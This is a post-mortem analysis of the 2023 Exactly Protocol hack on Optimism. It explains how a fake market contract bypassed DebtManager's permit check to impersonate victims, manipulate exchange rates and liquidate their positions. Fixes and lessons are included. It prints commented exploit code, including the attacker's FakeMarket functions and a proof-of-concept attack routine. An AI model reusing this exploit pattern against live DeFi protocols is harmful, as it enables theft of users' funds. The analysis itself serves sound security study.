# Exactly Protocol — Peripheral Contract Access Control Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2023-08-18 |
| **Protocol** | Exactly Protocol |
| **Chain** | Optimism |
| **Loss** | ~$7,000,000 (total assets reduced: $12.85M → final $7M after partial recovery) |
| **Attacker EOA** | [0x3747...1af9](https://optimistic.etherscan.io/address/0x3747dbbcb5c07786a4c59883e473a2e38f571af9) |
| **Attack Contract** | [0x6dD6...5B4d](https://optimistic.etherscan.io/address/0x6dd61c69415c8ecab3fefd80d079435ead1a5b4d) |
| **Vulnerable Contract** | [0x675d...1060 (DebtManager Proxy)](https://optimistic.etherscan.io/address/0x675d410dcf6f343219aae8d1dde0bfab46f52106) |
| **Implementation** | [0x910e...adb3 (DebtManager Impl)](https://optimistic.etherscan.io/address/0x910e91d24a948c3e36b71b505fb45fe80e95adb3) |
| **Attack Tx** | [0x3d63...20e](https://optimistic.etherscan.io/tx/0x3d6367de5c191204b44b8a5cf975f257472087a9aadc59b5d744ffdef33a520e) |
| **Root Cause** | DebtManager `leverage()` — permit signature bypass and arbitrary `_msgSender` impersonation via a fake market contract |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Exactly_exp.sol) |

---

## 1. Vulnerability Overview

Exactly Protocol is a fixed-rate lending protocol built on Optimism. The protocol provides convenience functions such as `leverage()` and `crossDeleverage()` through a peripheral contract called `DebtManager`.

**Core Vulnerability**: The `DebtManager.leverage()` function calls `safePermit()` on a market token via the `permit` modifier, which sets `_msgSender` to `p.account`. However, this `permit` validation trusts **an arbitrary market contract passed by the caller** to verify the signature.

The attacker deployed a fake `FakeMarket` contract whose `permit()` function performs no signature validation whatsoever. As a result:

1. When `leverage(fakeMarket, ..., Permit{account: victim, ...})` is called,
2. The `permit` modifier calls `fakeMarket.permit(victim, ...)` → passes with no signature check,
3. `_msgSender = victim` is set,
4. `fakeMarket.deposit()` is called → `FakeMarket.deposit()` executes `DebtManager.crossDeleverage()` with `_msgSender = victim`,
5. The victim's `exaUSDC` balance is replaced with worthless FakeTokens,
6. The victim's collateral value drops → liquidation threshold is triggered.

In the second phase, by repeatedly calling `borrowAtMaturity`/`repayAtMaturity`, the `convertToAssets` ratio of `exaUSDC` is artificially lowered to push victims below the liquidation threshold, and liquidation is finally executed to extract profit.

---

## 2. Vulnerable Code Analysis

### 2.1 `permit` Modifier — Trusting an Arbitrary Contract (Core Vulnerability)

```solidity
// ❌ Vulnerable permit modifier (DebtManager.sol)
modifier permit(ERC20 token, Permit calldata p) {
    // Problem: `token` is an arbitrary contract passed by the caller — no validation
    // FakeMarket.permit() performs no signature check, so anyone can pass
    IERC20PermitUpgradeable(address(token)).safePermit(
        p.account, address(this), p.value, p.deadline, p.v, p.r, p.s
    );
    {
        address sender = _msgSender;
        // If _msgSender is empty, set it to p.account (victim address)
        if (sender == address(0)) _msgSender = p.account; // ❌ Impersonates victim after bypassing signature
        else assert(p.account == sender);
    }
    _;
    assert(_msgSender == address(0));
    // Check remaining allowance — already too late
    if (token.allowance(p.account, address(this)) >
        p.value.mulWadDown(MAX_ALLOWANCE_SURPLUS)) {
        revert AllowanceSurplus();
    }
}
```

```solidity
// ✅ Fixed permit modifier — only whitelisted markets allowed
modifier permit(ERC20 token, Permit calldata p) {
    // ✅ Fix: Verify the market is approved by DebtManager
    require(auditor.isMarketListed(Market(address(token))), "invalid market");
    IERC20PermitUpgradeable(address(token)).safePermit(
        p.account, address(this), p.value, p.deadline, p.v, p.r, p.s
    );
    {
        address sender = _msgSender;
        if (sender == address(0)) _msgSender = p.account;
        else assert(p.account == sender);
    }
    _;
    assert(_msgSender == address(0));
    if (token.allowance(p.account, address(this)) >
        p.value.mulWadDown(MAX_ALLOWANCE_SURPLUS)) {
        revert AllowanceSurplus();
    }
}
```

**Issue**: The `token` (= `market`) passed to the `permit` modifier is never validated as an officially approved market in Exactly Protocol. Therefore, if an attacker deploys an arbitrary `FakeMarket` contract and makes its `permit()` function unconditionally pass, any address can be set as `_msgSender`.

---

### 2.2 `leverage()` Function — Vulnerable Entry Point

```solidity
// ❌ Vulnerable leverage() — arbitrary market and permit allow _msgSender impersonation
function leverage(
    Market market,          // ❌ Accepts fake FakeMarket address
    uint256 deposit,
    uint256 ratio,
    uint256 borrowAssets,
    Permit calldata marketPermit  // ❌ v=0, r=0, s=0 — passes without a signature
) external permit(market, marketPermit) msgSender {
    // permit modifier sets _msgSender = marketPermit.account (victim)
    // When market.deposit() is called, FakeMarket.deposit() executes
    // Inside FakeMarket.deposit(), _msgSender is the victim, so
    // crossDeleverage() can be executed on behalf of the victim
    noTransferLeverage(market, deposit, ratio, borrowAssets);
}
```

```solidity
// ✅ Fixed leverage() — market whitelist validation
function leverage(
    Market market,
    uint256 deposit,
    uint256 ratio,
    uint256 borrowAssets,
    Permit calldata marketPermit
) external permit(market, marketPermit) msgSender {
    // ✅ auditor.isMarketListed() validation performed inside permit modifier
    noTransferLeverage(market, deposit, ratio, borrowAssets);
}
```

---

### 2.3 `FakeMarket.permit()` — No Signature Validation

```solidity
// ❌ FakeMarket.permit() deployed by the attacker — performs zero signature validation
function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,      // ❌ Passes even if v=0
    bytes32 r,    // ❌ Passes even if r=0
    bytes32 s     // ❌ Passes even if s=0
) public {
    _useNonce(owner); // Only consumes nonce, no ecrecover signature check — ❌
}
```

---

### 2.4 `FakeMarket.deposit()` — Executes crossDeleverage on Behalf of the Victim

```solidity
// ❌ FakeMarket.deposit() — called with _msgSender set to the victim
function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    // DebtManager's _msgSender = victim address
    // crossDeleverage() uses the victim's exaUSDC allowance as _msgSender (victim)
    
    // Calculate victim's available collateral
    (uint256 sumCollateral, uint256 sumDebtPlusEffects) = 
        Auditor.accountLiquidity(address(victim), address(0), 0);
    uint256 availableCollateralAmount = ...; // victim's spare collateral
    
    // Add one-sided liquidity to FakeToken-USDC Uni-V3 pool
    UNIV3NFTManager.mint(...); // Supply only FakeToken → sets USDC price extremely high
    
    // ❌ Key: _msgSender = victim, so victim's position is manipulated
    // Withdraws victim's exaUSDC (USDC collateral) and swaps it for FakeToken
    DebtManager.crossDeleverage(
        address(exaUSDC),   // marketIn: victim's USDC collateral market
        address(this),       // marketOut: FakeMarket (worthless)
        500,                 // fee
        0, 0,
        sqrtPriceLimitX96    // price limit set by attacker
    ); // Victim's USDC → replaced with FakeToken — ❌
    
    // Remove liquidity and collect
    UNIV3NFTManager.decreaseLiquidity(...);
    UNIV3NFTManager.collect(...); // Sends recovered USDC to attacker (Owner)
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys 1 `FakeMarket` contract
- Creates 16 `FakeMarket` instances via `Clone()` (minimal proxy)
- Creates and initializes a FakeToken-USDC Uniswap V3 pool for each `FakeMarket`
- Sets the addresses of 8 victims in each FakeMarket (`setVictim()`)

### 3.2 Execution Phase — Step 1: Stealing Victim Collateral

```
Attacker
  │
  │  1. leverage(FakeMarket[i], 0, 0, 0, Permit{account: victim[i], v:0, r:0, s:0})
  ▼
DebtManager.leverage()
  │
  │  2. permit modifier: calls FakeMarket[i].permit(victim, ...)
  ▼
FakeMarket.permit()
  │
  │  3. Only consumes nonce with no signature check → passes ✓
  │     → _msgSender = victim[i] is set
  ▼
DebtManager internal
  │
  │  4. market.deposit(0, sender) → calls FakeMarket[i].deposit()
  ▼
FakeMarket.deposit()
  │
  │  5. Calculates victim[i]'s available collateral (availableCollateralAmount)
  │
  │  6. Supplies only FakeToken to FakeToken-USDC Uni-V3 pool
  │     (sets price so USDC trades 1:1 with FakeToken)
  │
  │  7. DebtManager.crossDeleverage(exaUSDC, FakeMarket, ...)
  │     → executes in victim[i]'s name because _msgSender = victim[i]
  ▼
DebtManager.crossDeleverage() — in victim's name
  │
  │  8. Withdraws victim's exaUSDC collateral
  │     → Balancer flash loan → Uni-V3 swap
  │     → Victim's USDC → replaced with FakeToken
  ▼
FakeMarket.deposit() returns
  │
  │  9. Remove Uni-V3 liquidity → recover USDC
  │  10. UNIV3NFTManager.collect() → sends recovered USDC to attacker (Owner)
  ▼
Result: Victim's collateral replaced with FakeToken (worthless)
```

### 3.3 Execution Phase — Step 2: Exchange Rate Manipulation

```
Attacker
  │
  │  11. Deposit 90% of USDC balance into exaUSDC (acquire shares)
  ▼
exaUSDC.deposit()
  │
  │  12. Repeat 6 times:
  │      exaUSDC.borrowAtMaturity(maturity[i], ...)
  │      → Fixed-maturity loan reduces backupEarnings
  │      exaUSDC.repayAtMaturity(maturity[i], ...)
  │      → Immediate repayment — further reduces backupEarnings
  ▼
Effect: exaUSDC.convertToAssets() ratio decreases
  │
  │  13. exaUSDC.redeem() → redeem all deposited shares
  ▼
Result: Victim's exaUSDC collateral value falls below debt
        (liquidatable state)
```

### 3.4 Execution Phase — Step 3: Liquidation

```
Attacker
  │
  │  14. Sequentially for each of 8 victims:
  │      exaUSDC.liquidate(victim[i], type(uint256).max, exaUSDC)
  ▼
exaUSDC.liquidate()
  │
  │  Collateral < debt → liquidation succeeds
  │  Collateral transferred to liquidator (attacker)
  │
  │  15. For remaining positions after liquidation:
  │      Re-execute leverage(FakeMarket[i+8], ..., Permit{victim[i]})
  │      → Drain remaining collateral as well
  ▼
Final result
```

### 3.5 Full Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        Attacker (EOA)                           │
│   0x3747...1af9                                                 │
└───────────────────────────┬─────────────────────────────────────┘
                            │ calls attack contract
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│              Attack Contract (0x6dD6...5B4d)                    │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 1) Create 16 FakeMarket instances (minimal proxy)        │   │
│  │ 2) Create FakeToken-USDC Uni-V3 pool for each FakeMarket │   │
│  │ 3) Set 8 victim addresses in each FakeMarket             │   │
│  └──────────────────────────────────────────────────────────┘   │
└───────────────────────────┬─────────────────────────────────────┘
                            │
          ┌─────────────────┼──────────────────────┐
          │ Phase 1         │ Phase 2               │ Phase 3
          ▼                 ▼                        ▼
┌─────────────────┐  ┌─────────────────┐  ┌──────────────────────┐
│ Collateral Theft │  │ Exchange Rate   │  │    Liquidation       │
│                 │  │  Manipulation   │  │                      │
│ leverage() ×8   │  │                 │  │ liquidate() ×8       │
│ (FakeMarket,    │  │ deposit()       │  │                      │
│  victim permit) │  │ borrowAtMaturity│  │ leverage() ×8 re-run │
│                 │  │  × 6 times      │  │ (drain remaining     │
│ Impersonate     │  │ repayAtMaturity │  │  positions)          │
│ victim as       │  │  × 6 times      │  │                      │
│ _msgSender      │  │ redeem()        │  │                      │
│                 │  │                 │  │                      │
│ crossDeleverage │  │ convertToAssets │  │ Liquidate victim     │
│ → Victim USDC   │  │ ratio decreases │  │ collateral           │
│   → FakeToken   │  │                 │  │ Attacker collects    │
└────────┬────────┘  └────────┬────────┘  └──────────┬───────────┘
         │                    │                        │
         ▼                    ▼                        ▼
┌─────────────────────────────────────────────────────────────────┐
│                      Attacker Profit                            │
│       Drained exaUSDC positions of 8 victims → ~$7,000,000     │
└─────────────────────────────────────────────────────────────────┘
```

### 3.6 Results

| Item | Value |
|------|-----|
| exaUSDC totalAssets before attack | $75,844,182 USDC |
| exaUSDC totalAssets after attack | $62,984,393 USDC |
| Total asset decrease | ~$12,859,788 USDC |
| Final confirmed loss (after recovery) | ~$7,000,000 |
| Attack block | 108,375,558 (Optimism) |
| Number of victims | 8 |

---

## 4. PoC Code (Key Logic Excerpt + Comments)

```solidity
// ============================================================
// [Phase 1] FakeMarket Initialization
// ============================================================
function testExploit() external {
    fakeMarket = new FakeMarket();

    // Create 16 FakeMarket instances using the minimal proxy pattern
    // First 8: for initial collateral theft; last 8: for draining remaining positions after liquidation
    for (uint256 i; i < 16; ++i) {
        address miniProxy = Clone(address(fakeMarket)); // deploy minimal proxy
        fakeMarketList.push(FakeMarket(miniProxy));
        FakeMarket(miniProxy).init(
            address(UNIV3NFTManager),
            address(Auditor),
            address(DebtManager),
            address(exaUSDC),
            address(Quoter),
            address(USDC),
            address(USDCPirceFeed),
            1_000_000 // baseUnit: USDC decimals
        );
        // init() internally creates a FakeToken-USDC Uni-V3 500bps pool
    }

    USDC.approve(address(exaUSDC), type(uint256).max); // approve exaUSDC

    // ============================================================
    // [Phase 1] Victim Collateral Theft — exploit leverage() vulnerability
    // ============================================================
    for (uint256 i; i < 8; ++i) {
        fakeMarketList[i].setVictim(victimList[i]); // set victim address

        // Core attack call:
        // - market: FakeMarket (fake market — bypasses validation)
        // - deposit, ratio, borrowAssets: all 0
        // - Permit.account = victim (sets victim address without a signature)
        DebtManager.leverage(
            address(fakeMarketList[i]), // ❌ fake market address
            0, 0, 0,
            IDebtManager.Permit({
                account: address(victimList[i]), // ❌ victim address to impersonate
                deadline: 0,
                v: 0,   // ❌ no signature — FakeMarket.permit() passes without validation
                r: bytes32(0),
                s: bytes32(0)
            })
        );
        // → Internally:
        //   1. permit(FakeMarket, ...) modifier → FakeMarket.permit() passes
        //   2. _msgSender = victimList[i] is set
        //   3. FakeMarket.deposit() is called
        //   4. crossDeleverage() is executed inside FakeMarket.deposit()
        //   5. Victim's USDC collateral is replaced with FakeToken
    }

    // ============================================================
    // [Phase 2] Manipulate convertToAssets ratio
    // ============================================================
    uint256 depositAmount = USDC.balanceOf(address(this)) * 9 / 10;
    uint256 share = exaUSDC.deposit(depositAmount, address(this)); // large deposit

    for (uint256 i; i < 6; ++i) {
        // borrowAtMaturity: fixed-maturity loan → reduces backupEarnings
        exaUSDC.borrowAtMaturity(
            maturityList[i], depositAmount / 2, type(uint256).max,
            address(this), address(this)
        );
        // repayAtMaturity: immediate repayment → further reduces backupEarnings
        // Repeating this process decreases the assets-per-share ratio (convertToAssets)
        exaUSDC.repayAtMaturity(maturityList[i], type(uint256).max, type(uint256).max, address(this));
    }

    exaUSDC.redeem(share, address(this), address(this)); // redeem all deposited shares

    // ============================================================
    // [Phase 3] Execute liquidation + re-attack remaining positions
    // ============================================================
    for (uint256 i; i < 8; ++i) {
        // Result of Phase 1+2: victim collateral value < debt → liquidatable
        try exaUSDC.liquidate(victimList[i], type(uint256).max, address(exaUSDC)) {}
        catch { continue; }

        fakeMarketList[i + 8].setVictim(victimList[i]);
        // Re-execute leverage() on remaining positions after liquidation
        try DebtManager.leverage(
            address(fakeMarketList[i + 8]),
            0, 0, 0,
            IDebtManager.Permit({account: address(victimList[i]), deadline: 0, v: 0, r: bytes32(0), s: bytes32(0)})
        ) {} catch { continue; }
    }
}
```

```solidity
// ============================================================
// FakeMarket.permit() — Complete absence of signature validation (key enabler of the vulnerability)
// ============================================================
function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,      // ❌ passes even if 0
    bytes32 r,    // ❌ passes even if 0
    bytes32 s     // ❌ passes even if 0
) public {
    _useNonce(owner); // only consumes nonce, no ecrecover validation ❌
    // EIP-2612 standard permit must validate signature with ecrecover
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Insufficient input validation in peripheral contract (no market whitelist) | CRITICAL | CWE-20 | `03_access_control.md` | Wormhole (signature validation bypass) |
| V-02 | `_msgSender` impersonation — privilege escalation via permit signature bypass | CRITICAL | CWE-284 | `03_access_control.md` + `10_signature_replay.md` | Poly Network (privilege takeover) |
| V-03 | Exchange rate manipulation — repeated backupEarnings reduction | HIGH | CWE-682 | `16_accounting_sync.md` | Euler Finance (Donation Attack) |
| V-04 | Liquidation incentive abuse — forced liquidation via manipulated collateral ratio | HIGH | CWE-841 | `18_liquidation.md` | Venus Protocol (liquidation failure) |

### V-01: Insufficient Input Validation in Peripheral Contract (CRITICAL)
- **Description**: The `DebtManager.leverage()` function accepts an arbitrary `market` address as its first parameter and does not verify whether that market is a registered official market in the Auditor.
- **Impact**: An attacker can deploy a fake market that skips signature validation and impersonate any address as `_msgSender`. All user positions in the protocol can be drained.
- **Attack Conditions**: Any EOA can call `DebtManager.leverage()` (no access restriction). Victims must have pre-set an exaUSDC allowance for DebtManager.

### V-02: `_msgSender` Impersonation — Permit Signature Bypass (CRITICAL)
- **Description**: The `permit` modifier fully trusts the `token` contract passed to it when calling `token.safePermit()`. If the fake token's `permit()` does not validate signatures, passing zeroes for the signature still succeeds.
- **Impact**: `_msgSender` is set to an arbitrary address (the victim), enabling execution of all victim-scoped operations such as `crossDeleverage()`.
- **Attack Conditions**: The attacker only needs to deploy an ERC20-like contract with a custom `permit()` function.

### V-03: Exchange Rate Manipulation (HIGH)
- **Description**: Repeatedly calling `borrowAtMaturity` and `repayAtMaturity` in the same block continuously reduces `backupEarnings` of the fixed-maturity pool, causing the `convertToAssets` ratio to drop.
- **Impact**: The victim's collateral value can be artificially lowered to trigger a liquidatable state.
- **Attack Conditions**: The attacker must be able to deposit a large amount of USDC to perform significant borrowing.

### V-04: Liquidation Incentive Abuse (HIGH)
- **Description**: Using the manipulated collateral ratio from V-01~V-03, liquidation is triggered, and the liquidator (attacker) acquires the victim's collateral at a discount.
- **Impact**: Complete liquidation of victim positions and theft of funds.
- **Attack Conditions**: V-01~V-03 must succeed as prerequisites.

---

## 6. Remediation Recommendations

### Immediate Actions

#### (1) Add Market Whitelist Validation

```solidity
// ✅ Validate market on entry to leverage() and crossDeleverage()
modifier onlyListedMarket(address market) {
    // Only allow official markets registered in the Auditor
    require(auditor.isMarketListed(Market(market)), "DebtManager: unlisted market");
    _;
}

// ✅ Example application
function leverage(
    Market market,
    uint256 deposit,
    uint256 ratio,
    uint256 borrowAssets,
    Permit calldata marketPermit
) external
    onlyListedMarket(address(market))  // ✅ Added
    permit(market, marketPermit)
    msgSender
{
    noTransferLeverage(market, deposit, ratio, borrowAssets);
}
```

#### (2) Strengthen Token Validation Inside `permit` Modifier

```solidity
modifier permit(ERC20 token, Permit calldata p) {
    // ✅ Fix: Verify it is an approved market token first
    require(auditor.isMarketListed(Market(address(token))), "DebtManager: invalid market token");
    
    IERC20PermitUpgradeable(address(token)).safePermit(
        p.account, address(this), p.value, p.deadline, p.v, p.r, p.s
    );
    {
        address sender = _msgSender;
        if (sender == address(0)) _msgSender = p.account;
        else assert(p.account == sender);
    }
    _;
    assert(_msgSender == address(0));
    if (token.allowance(p.account, address(this)) >
        p.value.mulWadDown(MAX_ALLOWANCE_SURPLUS)) {
        revert AllowanceSurplus();
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: No market whitelist | Add `Auditor.isMarketListed()` check at all market parameter entry points |
| V-02: Permit signature bypass | Restrict the token parameter in the permit modifier to a whitelist |
| V-03: Exchange rate manipulation | Limit the number of `borrowAtMaturity`/`repayAtMaturity` repetitions within a single transaction, or enforce reentrancy guards |
| V-04: Liquidation abuse | Apply a cooldown to ratio changes within a single block when computing liquidation eligibility |
| General | Apply whitelist-based input validation to all external functions in peripheral contracts |

---

## 7. Lessons Learned

1. **Input validation in peripheral contracts must be as strict as in core contracts**: Security checks must not be relaxed simply because a function is a "convenience feature." In particular, functions that accept external contract addresses as parameters must always include whitelist/validation logic.

2. **The permit pattern must be designed so that the signature target cannot be an untrusted contract**: Delegating `safePermit()` to an arbitrary token address completely depends on that token's implementation. It must be restricted to apply only to official market contracts.

3. **The `_msgSender` pattern must be used with care**: Managing `_msgSender` as a global state variable becomes a vector for privilege escalation if not properly controlled. Either use `msg.sender` directly, or ensure the call stack is clearly controlled when propagating context.

4. **Composite attack scenarios must be considered**: This attack chained three vulnerabilities (missing market validation + permit bypass + exchange rate manipulation). Each component in isolation might be rated low risk, but the combination produces catastrophic results. Threat modeling must always examine inter-component interactions.

5. **When accepting EIP-2612 permit from external contracts, always verify standard compliance**: Confirm that the `permit()` function complies with EIP-2612 — i.e., that it performs signature validation via `ecrecover`. A fake token contract may implement the `permit()` interface but have different internal logic.

6. **Leverage/position manipulation functions must always be accompanied by reentrancy guards**: The structure in which `crossDeleverage()` executes within an external callback chain (Balancer flash loan → Uni-V3 swap) creates a complex call stack. In such structures, state variables like `_msgSender` carry the risk of being set to unexpected values.

---

## 8. On-Chain Verification

### 8.1 Attack Transaction Basic Information

| Item | Value |
|------|-----|
| Tx Hash | `0x3d6367de5c191204b44b8a5cf975f257472087a9aadc59b5d744ffdef33a520e` |
| Block Number | 108,375,558 (Optimism) |
| Attacker EOA (`from`) | `0x3747DbBCb5C07786a4c59883E473A2e38F571af9` ✅ Matches PoC |
| Attack Contract (`to`) | `0x6dD61c69415c8ECAb3FEFD80d079435ead1a5B4d` ✅ Matches PoC |
| Gas Limit | 29,000,000 |
| Status | Success (`status: 1`) |

### 8.2 PoC vs On-Chain Amount Comparison

| Item | PoC Description | On-Chain Actual Value | Match |
|------|---------|-------------|------|
| exaUSDC totalAssets before attack | ~$75.8M | 75,844,182.45 USDC | ✅ |
| exaUSDC totalAssets after attack | ~$62.9M | 62,984,393.87 USDC | ✅ |
| Total asset decrease | ~$7M (official) | 12,859,788.57 USDC | Partial recovery → $7M |
| Victim 1 pre-attack exaUSDC balance | 9,290,628,814,720 shares | 9,290,628,814,720 | ✅ |
| Victim 1 post-attack exaUSDC balance | - | 3,088,186,764,526 | 6.2B shares lost |
| DebtManager → Victim allowance | 4,666,937,165,723 shares | 4,666,937,165,723 | ✅ |
| Exchange rate before attack (1e18 shares) | ~1.01 USDC | 1.010840 USDC/share | ✅ |

### 8.3 Precondition Verification

- **Victim 1 exaUSDC → DebtManager allowance**: `4,666,937,165,723 shares` — Victims had pre-set an approve for DebtManager (required for using the leverage feature). This allowance is used by the attacker in `crossDeleverage()` in the victim's name.
- **Attack contract pre-attack USDC balance**: `0` — The attack exploits existing victim positions and can be launched with zero attacker capital.
- **DebtManager Proxy**: Confirmed as EIP-1967 proxy. Implementation: `0x910e91d24a948c3e36b71b505fb45fe80e95adb3` (bytecode size: ~48,714 bytes).

### 8.4 Additional Findings

- Vulnerable contract `0x16748cb753a68329ca2117a7647aa590317ebf41` has EIP-1967 slot set to `0x00...00`, making it a plain contract (not a proxy). This is the address referenced in the PoC's `@KeyInfo` comment; the actual DebtManager Proxy is `0x675d...1060`.
- `cast 4byte 0x03ee9f37` → `leverage(address,uint256,uint256,uint256,(address,uint256,uint8,bytes32,bytes32))` confirmed: exact function signature used by the PoC.

---

*Analysis date: 2026-04-11*
*PoC source: [DeFiHackLabs / Exactly_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Exactly_exp.sol)*
*On-chain verification: cast (Foundry) — Optimism RPC*